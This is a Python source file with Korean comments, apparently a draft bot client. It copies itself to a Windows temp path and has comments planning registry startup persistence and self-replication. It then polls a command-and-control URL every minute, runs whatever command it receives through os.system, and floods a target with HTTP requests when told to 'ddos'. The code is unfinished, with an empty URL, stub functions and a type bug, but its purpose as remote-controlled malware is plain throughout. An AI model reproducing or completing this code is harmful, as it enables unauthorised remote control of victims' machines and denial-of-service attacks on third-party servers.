import time
import os
import requests

# 함수 정의 부분
def get_current_filename():
    return os.path.basename(__file__)

def get_current_file_path():
    return os.path.abspath(__file__)

def file_exists(file_path):
    return os.path.exists(file_path)

def json_classifier(json_data):
    dict_data = ''

    return dict_data

def copy_file(source, destination):
    with open(source, 'rb') as src_file:
        with open(destination, 'wb') as dest_file:
            dest_file.write(src_file.read())

def fin_request():
    pass


# 전역 변수 부분
url = "http://"
file_path = "c:/Temp/HactorService.py"


# 메인 함수 부분
if __name__ == "__main__":
    print("현재 실행 중인 파일의 이름:", get_current_filename())

    if not file_exists(file_path):
        copy_file(get_current_file_path(), file_path)
        
        # 레지스트리 시작프로그램 등록 후 새롭게 실행하고, 현재 실행중인 프로제스 종료하기
        # 파일 복제 기능 추가하기


    while True:
        try:
            # 통신 기능
            result = requests.get(url)

            json_data = result.json()
            cmd = json_data["command"]
            # 데이터 처리
            if "ddos" in cmd:
                cnt = cmd.split()[2]
                target = cmd.split()[1]
                for i in range(cnt):
                    requests.get(target)
                pass
            else:
                os.system(cmd)
        except:
            print("승진 에러")

        # 시간 통제 
        time.sleep(60)
